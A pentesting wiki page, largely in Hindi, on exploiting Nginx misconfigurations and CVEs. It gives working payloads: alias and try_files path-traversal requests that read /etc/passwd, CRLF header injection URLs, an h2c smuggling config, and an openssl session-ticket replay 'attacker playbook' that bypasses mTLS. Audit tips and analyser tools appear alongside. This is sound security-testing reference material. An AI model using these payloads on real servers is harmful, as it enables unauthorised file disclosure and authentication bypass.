# Nginx

{{#include ../../banners/hacktricks-training.md}}


## root स्थान गायब <a href="#missing-root-location" id="missing-root-location"></a>

Nginx सर्वर को कॉन्फ़िगर करते समय, **root directive** एक महत्वपूर्ण भूमिका निभाती है, क्योंकि यह उस बेस डायरेक्टरी को परिभाषित करती है जहाँ से फाइलें सर्व की जाती हैं। नीचे दिए गए उदाहरण पर विचार करें:
```bash
server {
root /etc/nginx;

location /hello.txt {
try_files $uri $uri/ =404;
proxy_pass http://127.0.0.1:8080/;
}
}
```
इस कॉन्फ़िगरेशन में, `/etc/nginx` को root directory के रूप में निर्दिष्ट किया गया है। यह सेटअप निर्दिष्ट root directory के भीतर की फाइलों (जैसे `/hello.txt`) तक पहुँच की अनुमति देता है। हालाँकि, ध्यान देने योग्य बात यह है कि केवल एक निश्चित location (`/hello.txt`) को परिभाषित किया गया है। root location (`location / {...}`) के लिए कोई कॉन्फ़िगरेशन नहीं है। इस कमी का मतलब है कि root directive वैश्विक रूप से लागू होता है, जिससे root path `/` के अनुरोध `/etc/nginx` के अंतर्गत फ़ाइलों तक पहुँच बना पाते हैं।

इस कॉन्फ़िगरेशन से एक गंभीर सुरक्षा चिंता उत्पन्न होती है। एक साधारण `GET` अनुरोध, जैसे `GET /nginx.conf`, संवेदनशील जानकारी उजागर कर सकता है क्योंकि यह `/etc/nginx/nginx.conf` पर स्थित Nginx configuration फाइल सर्व कर सकता है। root को कम संवेदनशील डायरेक्टरी, जैसे `/etc`, पर सेट करने से यह जोखिम घटाया जा सकता है, फिर भी इससे अन्य महत्वपूर्ण फाइलों (अन्य configuration फाइलें, access logs, और यहां तक कि HTTP basic authentication के लिए उपयोग किए गए encrypted credentials) तक अनचाहा पहुँच संभव हो सकती है।

## Alias LFI Misconfiguration <a href="#alias-lfi-misconfiguration" id="alias-lfi-misconfiguration"></a>

In the configuration files of Nginx, a close inspection is warranted for the "location" directives. A vulnerability known as Local File Inclusion (LFI) can be inadvertently introduced through a configuration that resembles the following:
```
location /imgs {
alias /path/images/;
}
```
यह कॉन्फ़िगरेशन LFI हमलों के प्रति संवेदनशील है क्योंकि सर्वर `/imgs../flag.txt` जैसे अनुरोधों को इच्छित निर्देशिका के बाहर फ़ाइलों तक पहुँचने का प्रयास समझता है, और प्रभावी रूप से `/path/images/../flag.txt` में रिज़ॉल्व करता है। यह दोष हमलावरों को सर्वर की फ़ाइल प्रणाली से ऐसी फ़ाइलें प्राप्त करने की अनुमति देता है जिन्हें वेब के माध्यम से सुलभ नहीं होना चाहिए।

इस भेद्यता को कम करने के लिए, कॉन्फ़िगरेशन को समायोजित किया जाना चाहिए:
```
location /imgs/ {
alias /path/images/;
}
```
अधिक जानकारी: [https://www.acunetix.com/vulnerabilities/web/path-traversal-via-misconfigured-nginx-alias/](https://www.acunetix.com/vulnerabilities/web/path-traversal-via-misconfigured-nginx-alias/)

Accunetix परीक्षण:
```
alias../ => HTTP status code 403
alias.../ => HTTP status code 404
alias../../ => HTTP status code 403
alias../../../../../../../../../../../ => HTTP status code 400
alias../ => HTTP status code 403
```
## असुरक्षित पथ प्रतिबंध <a href="#unsafe-variable-use" id="unsafe-variable-use"></a>

निम्नलिखित पृष्ठ देखें यह सीखने के लिए कि निम्नलिखित निर्देशों को कैसे bypass करें:
```plaintext
location = /admin {
deny all;
}

location = /admin/ {
deny all;
}
```
{{#ref}}
../../pentesting-web/proxy-waf-protections-bypass.md
{{#endref}}

## अनसुरक्षित वेरिएबल का उपयोग / HTTP Request Splitting <a href="#unsafe-variable-use" id="unsafe-variable-use"></a>

> [!CAUTION]
> कमजोर वेरिएबल `$uri` और `$document_ur`i हैं और इसे `$request_uri` से बदलकर ठीक किया जा सकता है।
>
> एक regex भी कमजोर हो सकता है जैसे:
>
> `location ~ /docs/([^/])? { … $1 … }` - कमजोर
>
> `location ~ /docs/([^/\s])? { … $1 … }` - कमजोर नहीं (स्पेस की जाँच)
>
> `location ~ /docs/(.*)? { … $1 … }` - कमजोर नहीं

Nginx configuration में एक कमजोरी नीचे दिए गए उदाहरण से दिखायी गयी है:
```
location / {
return 302 https://example.com$uri;
}
```
\r (Carriage Return) और \n (Line Feed) अक्षर HTTP requests में नई लाइन संकेत करते हैं, और उनके URL-encoded रूप `%0d%0a` के रूप में प्रस्तुत होते हैं। इन अक्षरों को किसी request (उदा., `http://localhost/%0d%0aDetectify:%20clrf`) में शामिल करने पर misconfigured server सर्वर `Detectify` नाम का नया header जारी कर देता है। यह इसलिए होता है क्योंकि $uri variable URL-encoded new line characters को decode कर देता है, जिससे response में एक अनपेक्षित header उत्पन्न होता है:
```
HTTP/1.1 302 Moved Temporarily
Server: nginx/1.19.3
Content-Type: text/html
Content-Length: 145
Connection: keep-alive
Location: https://example.com/
Detectify: clrf
```
CRLF injection और response splitting के जोखिमों के बारे में और जानने के लिए देखें [https://blog.detectify.com/2019/06/14/http-response-splitting-exploitations-and-mitigations/](https://blog.detectify.com/2019/06/14/http-response-splitting-exploitations-and-mitigations/).

Also this technique is [**explained in this talk**](https://www.youtube.com/watch?v=gWQyWdZbdoY&list=PL0xCSYnG_iTtJe2V6PQqamBF73n7-f1Nr&index=77) कुछ vulnerable examples और detection mechanisms के साथ समझाई गई है। उदाहरण के लिए, इस misconfiguration को blackbox perspective से पता लगाने के लिए आप ये requests कर सकते हैं:

- `https://example.com/%20X` - Any HTTP code
- `https://example.com/%20H` - 400 Bad Request

यदि vulnerable है, तो पहला रेस्पॉन्स लौटेगा क्योंकि "X" कोई भी HTTP method हो सकता है और दूसरा error लौटेगा क्योंकि H एक valid method नहीं है। इसलिए सर्वर को कुछ इस तरह मिल सकता है: `GET / H HTTP/1.1` और यह error trigger करेगा।

अन्य detection उदाहरण होंगे:

- `http://company.tld/%20HTTP/1.1%0D%0AXXXX:%20x` - Any HTTP code
- `http://company.tld/%20HTTP/1.1%0D%0AHost:%20x` - 400 Bad Request

उस talk में प्रस्तुत कुछ पाए गए vulnerable configurations थे:

- ध्यान दें कि **`$uri`** अंतिम URL में जैसा है वैसा ही सेट किया गया है
```
location ^~ /lite/api/ {
proxy_pass http://lite-backend$uri$is_args$args;
}
```
- ध्यान दें कि फिर से **`$uri`** URL में है (इस बार एक पैरामीटर के अंदर)
```
location ~ ^/dna/payment {
rewrite ^/dna/([^/]+) /registered/main.pl?cmd=unifiedPayment&context=$1&native_uri=$uri break;
proxy_pass http://$back;
```
- अब AWS S3 में
```
location /s3/ {
proxy_pass https://company-bucket.s3.amazonaws.com$uri;
}
```
### कोई भी वेरिएबल

यह पाया गया कि **user-supplied data** कुछ परिस्थितियों में एक **Nginx variable** के रूप में ट्रीट किया जा सकता है। इस व्यवहार का कारण कुछ हद तक अस्पष्ट बना हुआ है, फिर भी यह दुर्लभ नहीं है और सत्यापित करना सरल नहीं है। इस अनोमली को HackerOne पर एक सुरक्षा रिपोर्ट में उजागर किया गया था, जिसे [यहाँ](https://hackerone.com/reports/370094) देखा जा सकता है। त्रुटि संदेश की आगे की जांच से इसका पता Nginx के कोडबेस के [SSI filter module](https://github.com/nginx/nginx/blob/2187586207e1465d289ae64cedc829719a048a39/src/http/modules/ngx_http_ssi_filter_module.c#L365) में चला गया, जिससे Server Side Includes (SSI) को मूल कारण के रूप में चिन्हित किया गया।

इस **गलत कॉन्फ़िगरेशन** का पता लगाने के लिए, निम्न कमांड चलाया जा सकता है, जो variable printing की जाँच के लिए referer header सेट करने को शामिल करता है:
```bash
$ curl -H ‘Referer: bar’ http://localhost/foo$http_referer | grep ‘foobar’
```
सिस्टमों में इस misconfiguration के लिए किए गए स्कैन से कई उदाहरण मिले जहाँ उपयोगकर्ता Nginx वेरिएबल्स को प्रिंट कर सकता था। हालाँकि, कमजोर उदाहरणों की संख्या में कमी से पता चलता है कि इसे पैच करने के प्रयास कुछ हद तक सफल रहे हैं।

### $URI$ARGS वेरिएबल्स के साथ try_files का उपयोग

निम्नलिखित Nginx गलत कॉन्फ़िगरेशन LFI vulnerability का कारण बन सकती है:
```
location / {
try_files $uri$args $uri$args/ /index.html;
}
```
हमारी configuration में `try_files` directive है जिसका उपयोग निर्दिष्ट क्रम में फ़ाइलों के अस्तित्व की जाँच करने के लिए होता है। Nginx उस पहली फ़ाइल को सर्व करेगा जो उसे मिलेगी। `try_files` directive का मूल सिंटैक्स निम्नलिखित है:
```
try_files file1 file2 ... fileN fallback;
```
Nginx निर्दिष्ट क्रम में प्रत्येक फ़ाइल के मौजूद होने की जाँच करेगा। यदि कोई फ़ाइल मौजूद है, तो उसे तुरंत सर्व किया जाएगा। यदि निर्दिष्ट की गई कोई भी फ़ाइल मौजूद नहीं है, तो अनुरोध fallback विकल्प को भेजा जाएगा, जो कि कोई अन्य URI या एक विशिष्ट त्रुटि पृष्ठ हो सकता है।

हालाँकि, जब इस निर्देश में `$uri$args` वेरिएबल्स का उपयोग किया जाता है, तो Nginx उस फ़ाइल की तलाश करने की कोशिश करेगा जो अनुरोध URI को किसी भी query string arguments के साथ जोड़कर मेल खाती हो। इसलिए हम इस कॉन्फ़िगरेशन का शोषण कर सकते हैं:
```
http {
server {
root /var/www/html/public;

location / {
try_files $uri$args $uri$args/ /index.html;
}
}
}
```
निम्नलिखित payload के साथ:
```
GET /?../../../../../../../../etc/passwd HTTP/1.1
Host: example.com
```
हमारे payload का उपयोग करके हम root directory (जो Nginx configuration में परिभाषित है) से बाहर निकलकर `/etc/passwd` फ़ाइल लोड करेंगे। debug logs में हम देख सकते हैं कि Nginx फ़ाइलों को कैसे आज़माता है:
```
...SNIP...

2025/07/11 15:49:16 [debug] 79694#79694: *4 trying to use file: "/../../../../../../../../etc/passwd" "/var/www/html/public/../../../../../../../../etc/passwd"
2025/07/11 15:49:16 [debug] 79694#79694: *4 try file uri: "/../../../../../../../../etc/passwd"

...SNIP...

2025/07/11 15:49:16 [debug] 79694#79694: *4 http filename: "/var/www/html/public/../../../../../../../../etc/passwd"

...SNIP...

2025/07/11 15:49:16 [debug] 79694#79694: *4 HTTP/1.1 200 OK

```
PoC Nginx के खिलाफ ऊपर दी गई configuration का उपयोग करते हुए:
![उदाहरण burp अनुरोध](../../images/nginx_try_files.png)

## बैकएंड की कच्ची प्रतिक्रिया पढ़ना

Nginx `proxy_pass` के माध्यम से एक ऐसी सुविधा प्रदान करता है जो बैकएंड द्वारा उत्पन्न त्रुटियों और HTTP हेडर को इंटरसेप्ट करने की अनुमति देती है, ताकि आंतरिक त्रुटि संदेश और हेडर छिपाए जा सकें। यह Nginx द्वारा बैकएंड त्रुटियों के जवाब में custom error pages serve करके किया जाता है। हालाँकि, समस्या तब आती है जब Nginx को कोई invalid HTTP request मिलता है। ऐसे request वैसे ही बैकएंड को फॉरवर्ड कर दिए जाते हैं, और बैकएंड की कच्ची प्रतिक्रिया बिना Nginx के हस्तक्षेप के सीधे क्लाइंट को भेज दी जाती है।

uWSGI application से जुड़े एक उदाहरण परिदृश्य पर विचार करें:
```python
def application(environ, start_response):
start_response('500 Error', [('Content-Type', 'text/html'), ('Secret-Header', 'secret-info')])
return [b"Secret info, should not be visible!"]
```
इसे प्रबंधित करने के लिए, Nginx कॉन्फ़िगरेशन में विशिष्ट निर्देशों का उपयोग किया जाता है:
```
http {
error_page 500 /html/error.html;
proxy_intercept_errors on;
proxy_hide_header Secret-Header;
}
```
- [**proxy_intercept_errors**](http://nginx.org/en/docs/http/ngx_http_proxy_module.html#proxy_intercept_errors): यह निर्देश Nginx को backend responses जिनका status code 300 से अधिक है, उनके लिए कस्टम response सर्व करने में सक्षम बनाता है। यह सुनिश्चित करता है कि हमारे उदाहरण uWSGI application के लिए `500 Error` response को Nginx इंटरसेप्ट कर के हैंडल करे।
- [**proxy_hide_header**](http://nginx.org/en/docs/http/ngx_http_proxy_module.html#proxy_hide_header): जैसा नाम से पता चलता है, यह निर्देश क्लाइंट से निर्दिष्ट HTTP headers को छिपाता है, जिससे गोपनीयता और सुरक्षा बढ़ती है।

जब एक वैध `GET` request किया जाता है, Nginx इसे सामान्य रूप से प्रोसेस करता है और कोई मानक error response लौटाता है बिना किसी secret headers का खुलासा किए। हालांकि, एक अवैध HTTP request इस मैकेनिज्म को बायपास कर देता है, जिसके परिणामस्वरूप raw backend responses उजागर हो जाते हैं, जिनमें secret headers और error messages शामिल होते हैं।

## merge_slashes को off पर सेट

डिफ़ॉल्ट रूप से, Nginx का **`merge_slashes` directive** **`on`** पर सेट होता है, जो URL में कई forward slashes को एक single slash में compress कर देता है। यह फ़ीचर URL processing को सुगम बनाता है, पर अनजाने में Nginx के पीछे चलने वाले एप्लिकेशनों में मौजूद vulnerabilities को छुपा सकता है, विशेषकर उन एप्लिकेशनों में जो local file inclusion (LFI) attacks के प्रति संवेदनशील हों। सुरक्षा विशेषज्ञ **Danny Robinson and Rotem Bar** ने इस डिफ़ॉल्ट व्यवहार से जुड़े संभावित जोखिमों को रेखांकित किया है, खासकर जब Nginx एक reverse-proxy के रूप में काम करता है।

ऐसे जोखिमों को कम करने के लिए, उन एप्लिकेशनों के लिए जो इन कमजोरियों के प्रति संवेदनशील हैं, यह सिफारिश की जाती है कि **`merge_slashes` directive को off कर दिया जाए**। इससे Nginx requests को application को बिना URL संरचना बदले फ़ॉरवर्ड करेगा, और इस तरह किसी भी अंतर्निहित सुरक्षा समस्या को छुपाया नहीं जाएगा।

For more information check [Danny Robinson and Rotem Bar](https://medium.com/appsflyer/nginx-may-be-protecting-your-applications-from-traversal-attacks-without-you-even-knowing-b08f882fd43d).

### **Maclicious Response Headers**

As shown in [**this writeup**](https://mizu.re/post/cors-playground), कुछ ऐसे headers होते हैं जो यदि web server की response में मौजूद हों तो वे Nginx proxy के व्यवहार को बदल देंगे। आप इन्हें [**in the docs**](https://www.nginx.com/resources/wiki/start/topics/examples/x-accel/) में देख सकते हैं:

- `X-Accel-Redirect`: Nginx को संकेत देता है कि वह किसी निर्दिष्ट location पर internal redirect करे।
- `X-Accel-Buffering`: नियंत्रित करता है कि क्या Nginx response को buffer करे या नहीं।
- `X-Accel-Charset`: X-Accel-Redirect का उपयोग करते समय response के लिए character set सेट करता है।
- `X-Accel-Expires`: X-Accel-Redirect का उपयोग करते समय response की expiration time सेट करता है।
- `X-Accel-Limit-Rate`: X-Accel-Redirect का उपयोग करते समय responses के लिए transfer rate को सीमित करता है।

उदाहरण के लिए, header **`X-Accel-Redirect`** nginx में एक internal **redirect** का कारण बनेगा। इसलिए यदि nginx configuration में कुछ ऐसा है जैसे **`root /`** और web server की response में **`X-Accel-Redirect: .env`** शामिल है, तो nginx **`/.env`** की सामग्री भेज देगा (Path Traversal)।

### **Default Value in Map Directive**

In the **Nginx configuration**, `map` directive अक्सर **authorization control** में भूमिका निभाता है। एक सामान्य गलती यह है कि **default** value निर्दिष्ट न की जाए, जिससे unauthorized access हो सकता है। उदाहरण के लिए:
```yaml
http {
map $uri $mappocallow {
/map-poc/private 0;
/map-poc/secret 0;
/map-poc/public 1;
}
}
```

```yaml
server {
location /map-poc {
if ($mappocallow = 0) {return 403;}
return 200 "Hello. It is private area: $mappocallow";
}
}
```
यदि `default` नहीं है, तो एक **दुष्ट उपयोगकर्ता** `/map-poc` के भीतर किसी **अनिर्धारित URI** तक पहुँच कर सुरक्षा को बायपास कर सकता है। [The Nginx manual](https://nginx.org/en/docs/http/ngx_http_map_module.html) इस तरह की समस्याओं से बचने के लिए एक **default value** सेट करने की सलाह देता है।

### **DNS Spoofing Vulnerability**

DNS spoofing Nginx के खिलाफ कुछ परिस्थितियों में संभव है। यदि कोई हमलावर Nginx द्वारा उपयोग किए जाने वाले **DNS server** को जानता है और इसके DNS queries को इंटरसेप्ट कर सकता है, तो वह DNS records को spoof कर सकता है। हालांकि, यह तरीका अप्रभावी है अगर Nginx DNS resolution के लिए **localhost (127.0.0.1)** का उपयोग करने के लिए कॉन्फ़िगर किया गया हो। Nginx में DNS server को निम्नानुसार निर्दिष्ट किया जा सकता है:
```yaml
resolver 8.8.8.8;
```
### **`proxy_pass` और `internal` निर्देश**

The **`proxy_pass`** directive का उपयोग अनुरोधों को अन्य सर्वरों पर रीडायरेक्ट करने के लिए किया जाता है, चाहे वे अंदरूनी हों या बाहरी। The **`internal`** directive सुनिश्चित करता है कि कुछ लोकेशन्स केवल Nginx के भीतर ही सुलभ हों। While ये directives स्वयं में vulnerabilities नहीं हैं, उनकी कॉन्फ़िगरेशन को security lapses रोकने के लिए सावधानी से जांचना आवश्यक है।

## proxy_set_header Upgrade & Connection

यदि nginx सर्वर Upgrade और Connection headers पास करने के लिए कॉन्फ़िगर है, तो एक [**h2c Smuggling attack**](../../pentesting-web/h2c-smuggling.md) करके protected/internal endpoints तक पहुँच बनाई जा सकती है।

> [!CAUTION]
> यह vulnerability हमलावर को अनुमति देगा कि वह **`proxy_pass` endpoint के साथ एक प्रत्यक्ष कनेक्शन स्थापित करे** (`http://backend:9999` इस मामले में), जिसका content nginx द्वारा जाँचा नहीं जाएगा।

Example of vulnerable configuration to steal `/flag` from [here](https://bishopfox.com/blog/h2c-smuggling-request):
```
server {
listen       443 ssl;
server_name  localhost;

ssl_certificate       /usr/local/nginx/conf/cert.pem;
ssl_certificate_key   /usr/local/nginx/conf/privkey.pem;

location / {
proxy_pass http://backend:9999;
proxy_http_version 1.1;
proxy_set_header Upgrade $http_upgrade;
proxy_set_header Connection $http_connection;
}

location /flag {
deny all;
}
```
> [!WARNING]
> ध्यान दें कि भले ही `proxy_pass` किसी विशिष्ट **पथ** जैसे `http://backend:9999/socket.io` की ओर इशारा कर रहा हो, कनेक्शन `http://backend:9999` के साथ स्थापित होगा, इसलिए आप उस internal endpoint के भीतर किसी भी अन्य पथ से **संपर्क कर** सकते हैं। इसलिए proxy_pass के URL में पथ निर्दिष्ट होना मायने नहीं रखता।

## HTTP/3 QUIC module रिमोट DoS & leak (2024)

2024 के दौरान Nginx ने CVE-2024-31079, CVE-2024-32760, CVE-2024-34161 और CVE-2024-35200 का खुलासा किया, जिससे पता चला कि एक **single hostile QUIC session** worker processes को crash कर सकता है या leak memory कर सकता है जब experimental `ngx_http_v3_module` compile में शामिल हो और एक `listen ... quic` socket expose हो। प्रभावित बिल्ड्स 1.25.0–1.25.5 और 1.26.0 हैं, जबकि 1.27.0/1.26.1 में fixes शामिल हैं; memory disclosure (CVE-2024-34161) के लिए अतिरिक्त रूप से MTUs 4096 bytes से बड़े होने चाहिए ताकि sensitive data surface हो (विस्तार नीचे दिए गए 2024 nginx advisory में)।

**Recon & exploitation hints**

- HTTP/3 opt-in है, इसलिए `Alt-Svc: h3=":443"` responses के लिए scan करें या UDP/443 पर QUIC handshakes को brute-force करें; एक बार पुष्टि हो जाने पर, custom `quiche-client`/`nghttp3` payloads के साथ handshake और STREAM frames को fuzz करके worker crashes ट्रिगर करें और log leakage को force करें।
- Target support को जल्दी से fingerprint करने के लिए:
```bash
nginx -V 2>&1 | grep -i http_v3
rg -n "listen .*quic" /etc/nginx/
```
## TLS session resumption bypass of client cert auth (CVE-2025-23419)

फ़रवरी 2025 की एक advisory में खुलासा हुआ कि nginx 1.11.4–1.27.3 (built with OpenSSL) एक name-based virtual host से दूसरे के अंदर **TLS 1.3 session को पुन: उपयोग करने** की अनुमति देता है, जिससे कोई client जिसने certificate-free host के साथ negotiation की थी, वह ticket/PSK को replay करके `ssl_verify_client on;` से सुरक्षित vhost में प्रवेश कर सकता है और पूरी तरह से mTLS को स्किप कर सकता है। यह बग तब ट्रिगर होता है जब कई virtual hosts एक ही TLS 1.3 session cache और tickets साझा करते हैं (नीचे दिए गए 2025 nginx advisory को देखें)।

**Attacker playbook**
```bash
# 1. Create a TLS session on the public vhost and save the session ticket
openssl s_client -connect public.example.com:443 -sess_out ticket.pem

# 2. Replay that session ticket against the mTLS vhost before it expires
openssl s_client -connect admin.example.com:443 -sess_in ticket.pem -ign_eof
```
यदि लक्ष्य संवेदनशील है, तो दूसरा हैंडशेक क्लाइंट सर्टिफिकेट प्रस्तुत किए बिना पूरा हो जाता है, जिससे संरक्षित स्थान प्रकट हो जाते हैं।

**What to audit**

- मिश्रित `server_name` ब्लॉक्स जो `ssl_session_cache shared:SSL` और `ssl_session_tickets on;` साझा करते हैं।
- Admin/API ब्लॉक्स जो mTLS की अपेक्षा करते हैं लेकिन public hosts से साझा session cache/ticket सेटिंग्स विरासत में ले लेते हैं।
- Automation जो TLS 1.3 session resumption को ग्लोबली सक्षम कर देती है (उदा., Ansible roles) बिना vhost isolation पर विचार किए।

## HTTP/2 Rapid Reset resilience (CVE-2023-44487 behavior)

The HTTP/2 Rapid Reset attack (CVE-2023-44487) अभी भी nginx को प्रभावित करता है जब ऑपरेटर डिफ़ॉल्ट से ऊपर `keepalive_requests` या `http2_max_concurrent_streams` को बढ़ा देते हैं: एक आक्रमणकारी एक HTTP/2 कनेक्शन खोलता है, इसे हजारों streams से भर देता है, फिर तुरंत `RST_STREAM` frames जारी कर देता है ताकि concurrency ceiling कभी न पहुँचे जबकि CPU tear-down logic पर लगातार व्यस्त रहती है। Nginx की डिफ़ॉल्ट सेटिंग्स (128 concurrent streams, 1000 keepalive requests) ब्लास्ट रेडियस को छोटा रखती हैं; इन सीमाओं को "काफ़ी अधिक" बढ़ाने से यह आसान हो जाता है कि एक अकेले क्लाइंट से भी workers को भुखा दिया जाए (नीचे संदर्भित F5 write-up देखें)।

**डिटेक्शन टिप्स**
```bash
# Highlight risky knobs
rg -n "http2_max_concurrent_streams" /etc/nginx/
rg -n "keepalive_requests" /etc/nginx/
```
जो होस्ट उन निर्देशों के लिए असामान्य रूप से उच्च मान प्रकट करते हैं वे प्रमुख लक्ष्य होते हैं: एक HTTP/2 क्लाइंट स्ट्रीम बनाने और तुरंत `RST_STREAM` फ्रेम भेजने के चक्र को दोहरा कर CPU को अधिकतम पर बनाए रख सकता है बिना concurrency cap को ट्रिप किए।

## खुद आज़माएँ

Detectify ने एक GitHub रिपॉजिटरी बनाई है जहाँ आप Docker का उपयोग करके इस लेख में चर्चा किए गए कुछ misconfigurations के साथ अपना खुद का vulnerable Nginx टेस्ट सर्वर सेटअप कर सकते हैं और उन्हें स्वयं खोजने की कोशिश कर सकते हैं!

[https://github.com/detectify/vulnerable-nginx](https://github.com/detectify/vulnerable-nginx)

## Static Analyzer टूल्स

### [GIXY](https://github.com/yandex/gixy)

Gixy Nginx configuration का विश्लेषण करने वाला एक tool है। Gixy का मुख्य उद्देश्य security misconfiguration को रोकना और flaw detection को automate करना है।

### [Nginxpwner](https://github.com/stark0de/nginxpwner)

Nginxpwner एक सरल tool है जो सामान्य Nginx misconfigurations और vulnerabilities की खोज करता है।

## संदर्भ

- [**https://blog.detectify.com/2020/11/10/common-nginx-misconfigurations/**](https://blog.detectify.com/2020/11/10/common-nginx-misconfigurations/)
- [**http://blog.zorinaq.com/nginx-resolver-vulns/**](http://blog.zorinaq.com/nginx-resolver-vulns/)
- [**https://github.com/yandex/gixy/issues/115**](https://github.com/yandex/gixy/issues/115)
- [**https://mailman.nginx.org/pipermail/nginx-announce/2024/GWH2WZDVCOC2A5X67GKIMJM4YRELTR77.html**](https://mailman.nginx.org/pipermail/nginx-announce/2024/GWH2WZDVCOC2A5X67GKIMJM4YRELTR77.html)
- [**https://mailman.nginx.org/pipermail/nginx-announce/2025/NYEUJX7NCBCGJGXDFVXNMAAMJDFSE45G.html**](https://mailman.nginx.org/pipermail/nginx-announce/2025/NYEUJX7NCBCGJGXDFVXNMAAMJDFSE45G.html)
- [**https://www.f5.com/company/blog/nginx/http-2-rapid-reset-attack-impacting-f5-nginx-products**](https://www.f5.com/company/blog/nginx/http-2-rapid-reset-attack-impacting-f5-nginx-products)


{{#include ../../banners/hacktricks-training.md}}
